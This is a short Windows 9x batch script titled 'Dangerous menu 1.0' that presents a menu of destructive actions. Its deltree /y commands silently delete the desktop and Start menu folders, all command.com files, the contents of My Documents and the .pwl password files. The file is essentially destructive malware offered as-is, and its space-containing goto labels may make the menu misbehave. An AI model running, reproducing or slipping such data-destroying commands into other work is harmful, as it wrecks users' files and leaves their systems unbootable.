@echo off
:menu
echo          Created by DVL ..... Life is a BATch.
echo              Welcome 2 Dangerous menu 1.0
echo.
echo.
echo    MENU
echo    ====
echo.
echo    1 - Delete everything from usual win9x desktop
echo    2 - Delete all command.com files from your pc
echo    3 - Delete all files from My Documents
echo    4 - Delete win password files
echo.
echo    Q - Quit
choice /c:1234Q>nul
if errorlevel 5 goto done
if errorlevel 4 goto Delete win password files
if errorlevel 3 goto Delete all files from My Documents
if errorlevel 2 goto Delete all command.com files from your pc
if errorlevel 1 goto Delete everything from usual win9x desktop
echo CHOICE missing
goto done
 
:Delete everything from usual win9x desktop
deltree/y c:\windows\web >nul
deltree/y c:\windows\startm~1 >nul
deltree/y c:\windows\desktop >nul
deltree/y c:\windows\applic~1 >nul
goto menu
 
:Delete all command.com files from your pc
deltree/y c:\command.com >nul
deltree/y c:\windows\command\command.com >nul
deltree/y c:\windows\command.com >nul
goto menu
 
:Delete all files from My Documents
deltree/y c:\mydocu~1\ >nul
goto menu
 
:Delete win password files
deltree/y c:\windows\*.pwl >nul
goto menu
 
:done